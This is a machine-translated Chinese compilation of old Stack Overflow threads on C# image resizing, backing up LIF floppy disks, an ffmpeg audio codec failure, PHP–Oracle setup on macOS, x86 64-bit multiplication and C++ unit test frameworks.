[http://www.codeproject.com/KB/GDI-plus/imgresizoutperfgdiplus.aspx](http://www.codeproject.com/KB/GDI-plus/imgresizoutperfgdiplus.aspx)

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-09-17T21:23:59.897

您无法在不损失一些质量的情况下调整图像大小，这仅仅是因为您正在减少像素数量。

不要减小客户端的大小，因为浏览器在调整图像大小方面做得不好。

您可以做的是在渲染之前或在用户上传之前以编程方式更改大小。

这是一篇文章，解释了在 c# 中执行此操作的一种方法：http: [//www.codeproject.com/KB/GDI-plus/imageresize.aspx](http://www.codeproject.com/KB/GDI-plus/imageresize.aspx)

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2008-09-17T21:26:17.783

除非您调整大小，否则您无法对光栅图形执行此操作。

您可以通过良好的过滤和平滑来调整大小而不会失去任何**明显**的质量。

您还可以更改图像的 DPI 元数据（假设它有一些），这将保持完全相同的像素数，但会改变图像编辑器在“真实世界”测量中对它的看法。

只是为了涵盖所有基础，如果您真的只是指图像的文件大小而不是实际图像尺寸，我建议您查看图像数据的无损编码。我对此的建议是将图像重新保存为 .png 文件（我倾向于使用绘画作为 Windows 中图像的免费转码器。在绘画中加载图像，另存为新格式）

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-11-05T21:13:51.743

看看你是否喜欢[这个开源 ASP.NET 模块的图像大小调整质量。](http://nathanaeljones.com/products/asp-net-image-resizer/)有一个现场演示，所以你可以自己弄乱它。它产生的结果（对我而言）无法与 Photoshop 输出区分开来。它也有类似的文件大小——MS 在他们的 JPEG 编码器上做得很好。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2013-02-05T16:02:09.027

在这里您还可以找到在此类中添加水印代码：

```
public class ImageProcessor
    {
        public Bitmap Resize(Bitmap image, int newWidth, int newHeight, string message)
        {
            try
            {
                Bitmap newImage = new Bitmap(newWidth, Calculations(image.Width, image.Height, newWidth));

                using (Graphics gr = Graphics.FromImage(newImage))
                {
                    gr.SmoothingMode = SmoothingMode.AntiAlias;
                    gr.InterpolationMode = InterpolationMode.HighQualityBicubic;
                    gr.PixelOffsetMode = PixelOffsetMode.HighQuality;
                    gr.DrawImage(image, new Rectangle(0, 0, newImage.Width, newImage.Height));

                    var myBrush = new SolidBrush(Color.FromArgb(70, 205, 205, 205));

                    double diagonal = Math.Sqrt(newImage.Width * newImage.Width + newImage.Height * newImage.Height);

                    Rectangle containerBox = new Rectangle();

                    containerBox.X = (int)(diagonal / 10);
                    float messageLength = (float)(diagonal / message.Length * 1);
                    containerBox.Y = -(int)(messageLength / 1.6);

                    Font stringFont = new Font("verdana", messageLength);

                    StringFormat sf = new StringFormat();

                    float slope = (float)(Math.Atan2(newImage.Height, newImage.Width) * 180 / Math.PI);

                    gr.RotateTransform(slope);
                    gr.DrawString(message, stringFont, myBrush, containerBox, sf);
                    return newImage;
                }
            }
            catch (Exception exc)
            {
                throw exc;
            }
        }

        public int Calculations(decimal w1, decimal h1, int newWidth)
        {
            decimal height = 0;
            decimal ratio = 0;

            if (newWidth < w1)
            {
                ratio = w1 / newWidth;
                height = h1 / ratio;

                return height.To<int>();
            }

            if (w1 < newWidth)
            {
                ratio = newWidth / w1;
                height = h1 * ratio;
                return height.To<int>();
            }

            return height.To<int>();
        }

    } 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-09-17T21:30:01.347

有一些东西，上下文感知调整大小，不知道你是否能够使用它，但值得一看，这是肯定的

一个不错的视频演示（放大出现在中间） [http://www.youtube.com/watch?v=vIFCV2spKtg](http://www.youtube.com/watch?v=vIFCV2spKtg)

这里可能有一些代码。 [http://www.semanticmetadata.net/2007/08/30/content-aware-image-resizing-gpl-implementation/](http://www.semanticmetadata.net/2007/08/30/content-aware-image-resizing-gpl-implementation/)

那是矫枉过正吗？也许您可以将一些简单的过滤器应用于放大的图像以稍微模糊像素，您可以研究一下。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-09-17T21:36:47.773

你是调整大还是小？是小百分比还是更大的因素，例如 2 倍、3 倍？您的应用程序的质量是什么意思？什么类型的图像——照片、硬边线条图，还是什么？编写自己的低级像素研磨代码或尝试尽可能多地使用现有库（.net 或其他）？

关于这个主题有大量的知识。关键概念是插值。

浏览建议：
* [http://www.all-in-one.ee/~dersch/interpolator/interpolator.html](http://www.all-in-one.ee/~dersch/interpolator/interpolator.html)
* [http://www.cambridgeincolour.com/tutorials/image-interpolation.htm](http://www.cambridgeincolour.com/tutorials/image-interpolation.htm)
* 对于 C#：[https： //secure.codeproject.com/KB/GDI-plus/imageprocessing4.aspx?display=PrintAll&fid=3657&df=90&mpp=25&noise=3&sort=Position&view=Quick&fr=26&select=629945](https://secure.codeproject.com/KB/GDI-plus/imageprocessing4.aspx?display=PrintAll&fid=3657&df=90&mpp=25&noise=3&sort=Position&view=Quick&fr=26&select=629945) *这是特定于java的，但可能具有教育意义[-http： //today.java.net/pub/a/today/2007/04/03/perils-of-image-getscaledinstance.html](http://today.java.net/pub/a/today/2007/04/03/perils-of-image-getscaledinstance.html)

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-09-17T21:42:08.323

这是一个提供 C# 图像大小调整代码示例的[论坛主题。](http://forums.asp.net/t/1038068.aspx)您可以使用[GD 库](http://www.libgd.org/Binders)绑定器之一在 C# 中进行重新采样。

# linux - 如何备份 LIF 格式的磁盘？

> ID：87758
> 
> 赞同：-1
> 
> 时间：2008-09-17T21:16:35.497
> 
> 标签：linux, filesystems, disk, dd

我有几张旧的 3.5 英寸软盘要备份。我创建磁盘映像的尝试失败了。我尝试使用 UNIX 实用程序 dd_rescue，但是当内核尝试打开 ( `/dev/fd0`) 时，我收到内核错误，

```
floppy0: probe failed... 
```

我想要一张图像，因为有些软盘使用的是 LIF 文件系统格式。有人对我应该做什么有任何想法吗？

惠普现在安捷伦制造了一些工具，可以读取和写入 LIF 格式化磁盘上的文件。我可以使用这些工具将文件复制并转换到本地磁盘，但在此过程中可能会丢失一些数据。换句话说，从 LIF 转换为其他格式返回 LIF 会丢失一些信息。

我只想备份磁盘上的原始字节，而不关心文件系统的类型。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-09-17T22:43:24.993

我想你会在[这里](http://www.hpcc.org/datafile/hpil/lif_utils.html)找到最好的资源。

此外，如果您要使用原始 dd，LIF 格式有 77 个柱面，而普通软盘有 80 个柱面。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-09-18T03:15:22.733

```
dd if=/dev/floppy0 of=animage.bin conv=noerror 
```

# video - 为什么使用 ffmpeg 从 wmv 到 flv 的某些转换失败？

> ID：87760
> 
> 赞同：3
> 
> 时间：2008-09-17T21:16:40.397
> 
> 标签：video, ffmpeg

一段时间以来，我一直在用这个砸我的头。我有 2 个使用 wmv3 编解码器编码的完全相同的 .wmv 文件。我使用以下命令将它们都通过 ffmpeg：

```
/usr/bin/ffmpeg -i file.wmv -ar 44100 -ab 64k -qscale 9 -s 512x384 -f flv file.flv 
```

一个文件转换得很好，并给了我以下输出：

```
 FFmpeg version SVN-r11070, Copyright (c) 2000-2007 Fabrice Bellard, et al.
  configuration: --prefix=/usr --incdir=/usr/include/ffmpeg --libdir=/usr/lib64 --shlibdir=/usr/lib64 --mandir=/usr/share/man --arch=x86_64 --extra-cflags=-O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector --param=ssp-buffer-size=4 -m64 -mtune=generic --enable-liba52 --enable-libfaac --enable-libfaad --enable-libgsm --enable-libmp3lame --enable-libtheora --enable-libvorbis --enable-libxvid --enable-libx264 --enable-pp --enable-pthreads --disable-static --enable-shared --enable-gpl --disable-debug --disable-optimizations --disable-strip
  libavutil version: 49.5.0
  libavcodec version: 51.48.0
  libavformat version: 51.19.0
  built on Jun 25 2008 09:17:38, gcc: 4.1.2 20070925 (Red Hat 4.1.2-33)
Seems stream 1 codec frame rate differs from container frame rate: 1000.00 (1000/1) -> 29.97 (30000/1001)
Input #0, asf, from 'ok.wmv':
  Duration: 00:14:22.3, start: 3.000000, bitrate: 467 kb/s
    Stream #0.0: Audio: wmav2, 44100 Hz, stereo, 64 kb/s
    Stream #0.1: Video: wmv3, yuv420p, 320x240 [PAR 0:1 DAR 0:1], 400 kb/s, 29.97 tb(r)
Output #0, flv, to 'ok.flv':
    Stream #0.0: Video: flv, yuv420p, 512x384 [PAR 0:1 DAR 0:1], q=2-31, 200 kb/s, 29.97 tb(c)
    Stream #0.1: Audio: libmp3lame, 44100 Hz, stereo, 64 kb/s
Stream mapping:
  Stream #0.1 -> #0.0
  Stream #0.0 -> #0.1
Press [q] to stop encoding
frame=25846 fps=132 q=9.0 Lsize=   88486kB time=862.4 bitrate= 840.5kbits/s
video:80827kB audio:6738kB global headers:0kB muxing overhead 1.050642% 
```

而另一个文件失败：

```
FFmpeg version SVN-r11070, Copyright (c) 2000-2007 Fabrice Bellard, et al.
  configuration: --prefix=/usr --incdir=/usr/include/ffmpeg --libdir=/usr/lib64 --shlibdir=/usr/lib64 --mandir=/usr/share/man --arch=x86_64 --extra-cflags=-O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector --param=ssp-buffer-size=4 -m64 -mtune=generic --enable-liba52 --enable-libfaac --enable-libfaad --enable-libgsm --enable-libmp3lame --enable-libtheora --enable-libvorbis --enable-libxvid --enable-libx264 --enable-pp --enable-pthreads --disable-static --enable-shared --enable-gpl --disable-debug --disable-optimizations --disable-strip
  libavutil version: 49.5.0
  libavcodec version: 51.48.0
  libavformat version: 51.19.0
  built on Jun 25 2008 09:17:38, gcc: 4.1.2 20070925 (Red Hat 4.1.2-33)
[wmv3 @ 0x3700940d20]Extra data: 8 bits left, value: 0

Seems stream 1 codec frame rate differs from container frame rate: 1000.00 (1000/1) -> 25.00 (25/1)
Input #0, asf, from 'bad3.wmv':
  Duration: 00:06:34.9, start: 4.000000, bitrate: 1666 kb/s
    Stream #0.0: Audio: 0x0162, 48000 Hz, stereo, 256 kb/s
    Stream #0.1: Video: wmv3, yuv420p, 512x384 [PAR 0:1 DAR 0:1], 1395 kb/s, 25.00 tb(r)
File 'ok.flv' already exists. Overwrite ? [y/N] y
Output #0, flv, to 'ok.flv':
    Stream #0.0: Video: flv, yuv420p, 512x384 [PAR 0:1 DAR 0:1], q=2-31, 200 kb/s, 25.00 tb(c)
    Stream #0.1: Audio: libmp3lame, 48000 Hz, stereo, 64 kb/s
Stream mapping:
  Stream #0.1 -> #0.0
  Stream #0.0 -> #0.1
Unsupported codec (id=0) for input stream #0.0 
```

我看到的唯一区别是输入音频编解码器

在职的：

```
Stream #0.0: Audio: wmav2, 44100 Hz, stereo, 64 kb/s 
```

不工作：

```
 Stream #0.0: Audio: 0x0162, 48000 Hz, stereo, 64 kb/s 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-27T11:53:59.773

实际上是音频格式引起了麻烦。音频格式由其 TwoCC（此处为 0x0162）标识。您可以在此处查找不同的 TwoCC：[http](http://wiki.multimedia.cx/index.php?title=TwoCC) ://wiki.multimedia.cx/index.php?title=TwoCC ，您会发现：

0x0162 Windows Media Audio Professional V9

据我所知，ffmpeg 和 mencoder 尚不支持此编解码器。您可以在谷歌搜索“ `ffmpeg audio 0x0162`”并自行检查。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-09-17T21:26:20.560

那么显而易见的答案是音频在第二个 wmv 文件中的编码方式不同，因此它们并不完全相同。您可以尝试强制它为“坏”wmv 使用特定的音频编解码器，看看是否有效。也许只是在选择正确的编解码器时遇到了麻烦？然而，“坏”的 wmv 似乎更有可能具有 ffmpeg 不支持的某种音频编解码器。

也尝试通常的东西，确保你已经升级到最新版本，检查任何可能包含错误修复等的开发版本。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2008-09-17T21:38:22.217

或者，或者，使用 mencoder

# php - 如何连接到Oracle数据库？

> ID：87769
> 
> 赞同：4
> 
> 时间：2008-09-17T21:17:49.253
> 
> 标签：php, database, oracle, macos

如何在 MAC OS X 上使用 PHP 连接到 Oracle？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-09-17T21:22:03.707

我认为OCI将是要走的路。PHP 有一个[模块](http://us3.php.net/manual/en/book.oci8.php)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-17T21:23:10.037

PDO 抽象层可用于连接到 Oracle DB 并在其上执行操作。这是[一篇](http://www.oracle.com/technology/pub/articles/php_experts/otn_pdo_oracle5.htm)关于如何在 Oracle 网站上使用 PDO 和 Oracle 的文章。

也可以使用[OCI](http://www.php.net/oci8)。

[Oracle PHP 开发中心](http://www.oracle.com/technology/tech/php/index.html)将提供更多关于同时使用 Oracle 和 PHP 的有用信息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-03-10T16:52:24.987

对于 osx 10.6 64bit 上的 Instantclient，请执行以下操作：

下载即时客户端库和 sdk，将它们全部放在一个文件夹中。如果您在 64 位机器上，请确保获得 64 位库，32 位将无法工作！- 先用 sqlplus 测试

如果它不存在则创建它

```
sudo vi /etc/launchd.conf 
```

并添加到文件中（使用您自己的路径！）

```
setenv DYLD_LIBRARY_PATH /usr/oracle_instantClient64 
```

此时您可能需要重新启动系统，以便 launchd 将路径传递给 apache 以获取路径，或者查看重新启动 launchd 是否有效，尽管我感觉无论如何都会重新启动系统！

您应该将“extension=oci8.so”添加到 php.ini

```
sudo vi /etc/php.ini 
```

如果该文件不存在复制 php.ini.default

```
sudo cp /etc/php.ini.default /etc/php.ini 
```

然后添加上面的扩展名，文件后面有一个包含很多扩展名的部分，把它放在那里

oci 需要一个库符号链接，所以这样做

```
sudo ln -s $DYLD_LIBRARY_PATH/libclntsh.dylib.10.1 $DYLD_LIBRARY_PATH/libclntsh.dylib 
```

在 oracle 二进制文件中还有一些奇怪的硬编码库链接，所以修复它

```
mkdir -p /b/227/rdbms/ 
```

它只在寻找 oracle 库，因此将其链接回来

```
ln -s /usr/oracle_instantClient64/ /b/227/rdbms/lib 
```

现在从 pear 存储库安装 oci8。如果您在未升级的情况下安装了雪豹 osx 10.6，您可能会遇到 pear 和 pecl 的问题。如果是这样，您将需要先安装 pear。见：[https ://discussions.apple.com/thread/2602597?start=0&tstart=0](https://discussions.apple.com/thread/2602597?start=0&tstart=0)

```
sudo pecl install oci8 
```

提示：不要使用自动检测，当它询问您时指定即时客户端路径..

```
instantclient,/usr/oracle_instantClient64 
```

重启阿帕奇

```
sudo apachectl graceful 
```

通过在浏览器中导航到 URL 进行测试，或者您可以直接在命令行上调用该文件

```
php index.php 
```

这就是它使用以下作为测试文件..

```
<?php 

$dbHost = "localhostOrDatabaseURL";
$dbHostPort="1521";
$dbServiceName = "servicename";
$usr = "username";
$pswd = "password";
$dbConnStr = "(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)
            (HOST=".$dbHost.")(PORT=".$dbHostPort."))
            (CONNECT_DATA=(SERVICE_NAME=".$dbServiceName.")))";

if(!$dbConn = oci_connect($usr,$pswd,$dbConnStr)){
$err = oci_error();
trigger_error('Could not establish a connection: ' . $err['message'], E_USER_ERROR);
};

$strSQL = "SELECT SYSDATE FROM DUAL";

$stmt = oci_parse($dbConn,$strSQL);
if ( ! oci_execute($stmt) ){
$err = oci_error($stmt);
trigger_error('Query failed: ' . $err['message'], E_USER_ERROR);
};

while(oci_fetch($stmt)){
    $rslt = oci_result($stmt, 1); print "<h3>query returned: ".$rslt."</h3>";
}
?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-17T21:29:24.593

我不具体了解 Mac，也不了解 PHP，但您通常需要安装 Oracle 客户端工具（即时客户端）。

[http://www.oracle.com/technology/tech/oci/instantclient/index.html](http://www.oracle.com/technology/tech/oci/instantclient/index.html)

安装后，您修改 TNSNAMES.ORA 文件以指向 Oracle 数据库的服务器和实例名称。

然后你可以使用 PHP “数据库连接”的东西（对不起）来创建一个连接并运行你的 SQL 语句。

使用 SQL*PLUS 客户端检查连接是否正常：

IE。

```
c:> SQLPLUS

CONNECT scott/tiger@mydatabase 
```

如果 TNSNAMES.ORA 正确，您应该获得连接，或者至少“用户名/密码不正确”证明您与 Oracle 实例进行了通信。

如果您收到 TNS-12521 (?) 错误，那么您的 TNSNAMES.ORA 不正确。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-09-18T13:41:59.670

使用 oci 接口连接到 oracle 数据库应该没有问题，例如使用“oci_connect()”。

更多示例在这里： http: [//php.net/manual/en/oci8.setup.php](http://php.net/manual/en/oci8.setup.php)

但我不明白，MAC OS X 的评论是什么意思 - 你在本地运行 apache 吗？

希望这会有所帮助，巴斯蒂安

# assembly - 如何使用 x86 汇编语言将两个 64 位数字相乘？

> ID：87771
> 
> 赞同：10
> 
> 时间：2008-09-17T21:17:59.147
> 
> 标签：assembly, x86, bigint, extended-precision

我该怎么去...

*   将两个 64 位数字相乘

*   两个 16 位十六进制数相乘

...使用汇编语言。

我只能使用寄存器 %eax、%ebx、%ecx、%edx 和堆栈。

编辑：哦，我在 x86 上使用 ATT 语法
EDIT2：不允许反编译成程序集...

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2008-09-17T21:26:53.447

使用可能应该是您的课程教科书，Randall Hyde 的“汇编语言的艺术”。

请参见[4.2.4 - 扩展精度乘法](http://www.plantation-productions.com/Webster/www.artofasm.com/Windows/HTML/AdvancedArithmetica2.html#1007619)

> 虽然 8x8、16x16 或 32x32 乘法通常就足够了，但有时您可能希望将更大的值相乘。您将使用 x86 单操作数 MUL 和 IMUL 指令进行扩展精度乘法..
> 
> 执行扩展精度乘法时要记住的最重要的事情可能*是您还必须同时执行多精度加法*。将所有部分产品相加需要多次添加才能产生结果。下面的清单演示了在 32 位处理器上将两个 64 位值相乘的正确方法。

（有关完整的组装清单和插图，请参阅链接。）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-21T08:45:34.417

如果这是 64x86，

```
function(x, y, *lower, *higher)
movq %rx,%rax     #Store x into %rax
mulq %y           #multiplies %y to %rax
#mulq stores high and low values into rax and rdx.
movq %rax,(%r8)   #Move low into &lower
movq %rdx,(%r9)   #Move high answer into &higher 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-09-17T21:29:28.120

由于您使用的是 x86，因此您需要 4 条 mull 指令。将 64 位数量拆分为两个 32 位字，并将低位字乘以结果的最低和第二低位字，然后来自不同数字的两对低位和高位字（它们转到结果的第二位和第三位最低字）和最后将两个高单词变成结果的2个最高单词。将它们加在一起不要忘记处理携带。您没有指定输入和输出的内存布局，因此无法编写示例代码。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-05-11T01:47:37.337

此代码假定您需要 x86（不是 x64 代码），您可能只需要 64 位产品，并且您不关心溢出或有符号数字。（签名版本类似）。

```
MUL64_MEMORY:
     mov edi, val1high
     mov esi, val1low
     mov ecx, val2high
     mov ebx, val2low
MUL64_EDIESI_ECXEBX:
     mov eax, edi
     mul ebx
     xch eax, ebx  ; partial product top 32 bits
     mul esi
     xch esi, eax ; partial product lower 32 bits
     add ebx, edx
     mul ecx
     add ebx, eax  ; final upper 32 bits
; answer here in EBX:ESI 
```

这不符合 OP 的确切寄存器约束，但结果完全符合 x86 提供的寄存器。（此代码未经测试，但我认为它是正确的）。

[注意：我从另一个已关闭的问题转移（我的）这个答案，因为这里没有其他“答案”直接回答了这个问题]。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-09-17T21:22:24.313

这取决于您使用的语言。从我学习 MIPS 汇编的记忆中，有一个 Move From High 命令和一个 Move From Lo 命令，或者 mflo 和 mfhi。mfhi 存储前 64 位，而 mflo 存储总数的低 64 位。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-09-17T21:29:21.880

啊组装，自从我使用它以来已经有一段时间了。所以我假设这里真正的问题是你正在使用的微控制器（我曾经在汇编中编写代码）没有 64 位寄存器？如果是这种情况，您将打破您正在使用的数字，并对这些数字进行多次乘法运算。

从你的措辞来看，这听起来像是一项家庭作业，所以我不会再详细说明了：P

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-09-17T21:29:52.847

只需进行正常的长乘法，就好像您将一对 2 位数字相乘，除了每个“数字”实际上是一个 32 位整数。如果您将地址 X 和 Y 处的两个数字相乘并将结果存储在 Z 中，那么您想要做的（在伪代码中）是：

```
Z[0..3] = X[0..3] * Y[0..3]
Z[4..7] = X[0..3] * Y[4..7] + X[4..7] * Y[0..3]
```

请注意，我们丢弃了结果的高 64 位（因为 64 位数字乘以 64 位数字就是 128 位数字）。另请注意，这是假设小端。此外，请注意有符号乘法与无符号乘法。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-09-17T21:31:05.387

找一个支持 64 位的 C 编译器（GCC 做 IIRC）编译一个程序，然后得到反汇编。GCC 可以自己将其吐出，您可以使用正确的工具将其从目标文件中取出。

OTOH 他们是 x86 上的 32bX32b = 64b 操作

```
a:b * c:d = e:f
// goes to
e:f = b*d;
x:y = a*d;  e += x;
x:y = b*c;  e += x; 
```

其他一切都溢出

（未经测试）

**仅编辑**未签名

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2008-09-17T21:32:04.603

我打赌你是个学生，所以看看你能不能完成这项工作：逐字逐句，并使用位移。想出最有效的解决方案。当心符号位。

* * *

## 回答 #10

> 赞同：-3
> 
> 时间：2016-03-05T10:44:26.173

如果你想要 128 模式试试这个...

```
__uint128_t AES::XMULTX(__uint128_t TA,__uint128_t TB)
{
    union
    {
        __uint128_t WHOLE;
        struct
        {
            unsigned long long int LWORDS[2];
        } SPLIT;
    } KEY;
    register unsigned long long int __XRBX,__XRCX,__XRSI,__XRDI;
    __uint128_t RESULT;

    KEY.WHOLE=TA;
    __XRSI=KEY.SPLIT.LWORDS[0];
    __XRDI=KEY.SPLIT.LWORDS[1];
    KEY.WHOLE=TB;
    __XRBX=KEY.SPLIT.LWORDS[0];
    __XRCX=KEY.SPLIT.LWORDS[1];
    __asm__ __volatile__(
                 "movq          %0,             %%rsi           \n\t"       
                 "movq          %1,             %%rdi           \n\t"
                 "movq          %2,             %%rbx           \n\t"
                 "movq          %3,             %%rcx           \n\t"
                 "movq          %%rdi,          %%rax           \n\t"
                 "mulq          %%rbx                           \n\t"
                 "xchgq         %%rbx,          %%rax           \n\t"
                 "mulq          %%rsi                           \n\t"
                 "xchgq         %%rax,          %%rsi           \n\t"
                 "addq          %%rdx,          %%rbx           \n\t"
                 "mulq          %%rcx                           \n\t"
                 "addq          %%rax,          %%rbx           \n\t"
                 "movq          %%rsi,          %0              \n\t"
                 "movq          %%rbx,          %1              \n\t"
                 : "=m" (__XRSI), "=m" (__XRBX)
                 : "m" (__XRSI),  "m" (__XRDI), "m" (__XRBX), "m" (__XRCX)
                 : "rax","rbx","rcx","rdx","rsi","rdi"
                 );
    KEY.SPLIT.LWORDS[0]=__XRSI;
    KEY.SPLIT.LWORDS[1]=__XRBX;
    RESULT=KEY.WHOLE;
    return RESULT;
} 
```

* * *

## 回答 #11

> 赞同：-3
> 
> 时间：2017-06-18T12:11:09.113

如果你想要 128 位乘法，那么这应该是 AT&T 格式的。

```
__uint128_t FASTMUL128(const __uint128_t TA,const __uint128_t TB)
{
    union
    {
        __uint128_t WHOLE;
        struct
        {
            unsigned long long int LWORDS[2];
        } SPLIT;
    } KEY;
    register unsigned long long int __RAX,__RDX,__RSI,__RDI;
    __uint128_t RESULT;

KEY.WHOLE=TA;
__RAX=KEY.SPLIT.LWORDS[0];
__RDX=KEY.SPLIT.LWORDS[1];
KEY.WHOLE=TB;
__RSI=KEY.SPLIT.LWORDS[0];
__RDI=KEY.SPLIT.LWORDS[1];
__asm__ __volatile__(
    "movq           %0,                             %%rax                   \n\t"
    "movq           %1,                             %%rdx                   \n\t"
    "movq           %2,                             %%rsi                   \n\t"
    "movq           %3,                             %%rdi                   \n\t"
    "movq           %%rsi,                          %%rbx                   \n\t"
    "movq           %%rdi,                          %%rcx                   \n\t"
    "movq           %%rax,                          %%rsi                   \n\t"
    "movq           %%rdx,                          %%rdi                   \n\t"
    "xorq           %%rax,                          %%rax                   \n\t"
    "xorq           %%rdx,                          %%rdx                   \n\t"
    "movq           %%rdi,                          %%rax                   \n\t"
    "mulq           %%rbx                                                   \n\t"
    "xchgq          %%rbx,                          %%rax                   \n\t"
    "mulq           %%rsi                                                   \n\t"
    "xchgq          %%rax,                          %%rsi                   \n\t"
    "addq           %%rdx,                          %%rbx                   \n\t"
    "mulq           %%rcx                                                   \n\t"
    "addq           %%rax,                          %%rbx                   \n\t"
    "movq           %%rsi,                          %%rax                   \n\t"
    "movq           %%rbx,                          %%rdx                   \n\t"
    "movq           %%rax,                          %0                      \n\t"
    "movq           %%rdx,                          %1                      \n\t"
    "movq           %%rsi,                          %2                      \n\t"
    "movq           %%rdi,                          %3                      \n\t"
    : "=m"(__RAX),"=m"(__RDX),"=m"(__RSI),"=m"(__RDI)
    :  "m"(__RAX), "m"(__RDX), "m"(__RSI), "m"(__RDI)
    : "rax","rbx","ecx","rdx","rsi","rdi"
);
KEY.SPLIT.LWORDS[0]=__RAX;
KEY.SPLIT.LWORDS[1]=__RDX;
RESULT=KEY.WHOLE;
return RESULT;
} 
```

# c++ - C++ 单元测试框架

> ID：87794
> 
> 赞同：61
> 
> 时间：2008-09-17T21:21:32.007
> 
> 标签：c++, unit-testing

我为我的 C++ 代码使用了 Boost Test 框架，但它有两个问题可能是所有 C++ 测试框架共有的：

*   无法创建自动测试存根（例如，通过从选定的类中提取公共函数）。
*   您不能运行单个测试 - 您必须运行整个“套件”测试（我猜除非您创建了许多不同的测试项目）。

有谁知道更好的测试框架，还是我永远嫉妒 Java/.NET 开发人员可用的测试工具？

* * *

## 回答 #1

> 赞同：67
> 
> 时间：2010-12-28T03:38:25.263

我刚刚推出了我自己的框架[CATCH](http://www.levelofindirection.com/journal/2010/12/28/unit-testing-in-c-and-objective-c-just-got-easier.html)。它仍在开发中，但我相信它已经超越了大多数其他框架。不同的人有不同的标准，但我试图在没有太多权衡的情况下涵盖大部分内容。请查看我的链接博客条目以供品酒师使用。我的前五个功能是：

*   仅标题
*   基于功能和方法的测试的自动注册
*   将标准 C++ 表达式分解为 LHS 和 RHS（因此您不需要一整套断言宏）。
*   支持基于功能的夹具中的嵌套部分
*   使用自然语言命名测试 - 生成函数/方法名称

它*不*生成存根——但这是一个相当专业的领域。我认为[Isolator++](http://www.typemock.com/isolatorpp-product-page)是第一个真正实现这一目标的工具。请注意，模拟/存根框架通常独立于单元测试框架。CATCH 特别适用于模拟对象，因为测试状态不是通过上下文传递的。

它还具有 Objective-C 绑定。

[更新]

几年前刚刚发生在我的这个答案中。感谢所有伟大的评论！显然，Catch 在那段时间里发展了很多。它现在支持 BDD 样式测试（given/when/then），标签，现在在*单个*标题中，以及大量内部改进和改进（例如，更丰富的命令行、清晰和富有表现力的输出等）。[更新的博客文章在这里。](http://www.levelofindirection.com/journal/2013/6/28/catch-10.html)

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2008-09-18T02:59:26.970

看看 Google C++ 测试框架。

Google 将其用于所有内部 C++ 项目，因此它一定非常好。

[http://googletesting.blogspot.com/2008/07/announcing-new-google-c-testing.html](http://googletesting.blogspot.com/2008/07/announcing-new-google-c-testing.html)

[http://code.google.com/p/googletest](http://code.google.com/p/googletest)

* * *

## 回答 #3

> 赞同：22
> 
> 时间：2008-12-26T18:22:43.693

Boost.Test 确实允许按名称运行测试用例。或测试套件。或者其中几个。

Boost.Test 并不坚持实现 main，尽管它确实使这样做很容易。

Boost.Test 不需要用作库。它具有单个标题变体。

* * *

## 回答 #4

> 赞同：20
> 
> 时间：2008-09-18T13:56:26.187

我刚刚回答了一个[非常相似的问题](https://stackoverflow.com/questions/91384/unit-testing-for-c-code-tools-and-methodology#92569). 我最终使用了 Noel Llopis 的 UnitTest++。比起 boost::test，我更喜欢它，因为它不坚持使用宏来实现测试工具的主程序——它可以插入到您创建的任何可执行文件中。它确实遭受了与 boost::test 相同的负担，因为它需要链接一个库。我使用过 CxxTest，它确实比 C++ 中的任何其他东西更接近于自动生成测试（尽管它需要 Perl成为您的构建系统的一部分来执行此操作）。C++ 只是不提供 .NET 语言和 Java 提供的反射钩子。Visual Studio Team System - Developer's Edition 中的 MsTest 工具将自动生成非托管 C++ 的测试存根，但必须从 DLL 导出方法才能执行此操作，因此它不适用于静态库。中的其他测试框架。NET 世界可能也有这种能力，但我对这些都不熟悉。因此，现在我们将 UnitTest++ 用于非托管 C++，而我目前正在为托管库选择 MsTest 和 NUnit。

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2008-09-17T21:29:54.810

[我是UnitTest++](https://github.com/unittest-cpp/unittest-cpp)的忠实粉丝，它非常轻量级，但能胜任。您可以在那里轻松地运行单个测试。

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2008-09-17T21:35:32.847

好问题！几年前，我一直在四处寻找值得使用的东西，但最终还是失败了。我一直在寻找非常轻量级的东西，并且不需要我在某些库中链接……你知道**我可以在几分钟内启动并运行的东西。**

但是，我坚持并最终跑过[**cxxtest**](https://github.com/CxxTest/cxxtest)。

从网站：

*   不需要 RTTI
*   不需要成员模板函数
*   不需要异常处理
*   不需要任何外部库（包括内存管理、文件/控制台 I/O、图形库）
*   完全作为一组头文件（和一个 python 脚本）分发。

**哇...超级简单！**包含一个从 Test 类派生的头文件，然后您就可以开始运行了。在过去的四年里，我们一直在使用它，但我仍然没有找到任何让我更满意的东西。

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2008-09-17T21:24:46.820

